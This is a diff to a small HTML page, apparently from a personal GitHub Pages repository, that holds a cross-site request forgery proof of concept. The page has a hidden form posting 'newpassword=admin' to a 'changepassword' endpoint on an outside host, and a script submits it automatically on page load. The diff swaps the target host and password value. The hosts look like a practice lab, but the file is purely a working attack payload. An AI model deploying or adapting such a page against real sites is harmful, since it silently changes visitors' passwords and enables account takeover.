@@ -1,16 +1,14 @@
-# alZerNest.github.io
 <!DOCTYPE html>
 
 <html>
 <head>
-    <meta charset="utf-8">
     <title>user</title>
 </head>
 <body>
-    <form action="http://bznzzij.haobachang2.loveli.com.cn:8888/changepassword" method="POST">
-    <input type="hidden" name="newpassword" value="user" />
-    <script>document.forms[0].submit();</script>
+    <form action="http://6c20gst.haobachang1.loveli.com.cn:8888/changepassword" method="POST">
+    <input type="hidden" name="newpassword" value="admin" />
     </form>
+    <script>document.forms[0].submit();</script>
 </body>
 </html>
 
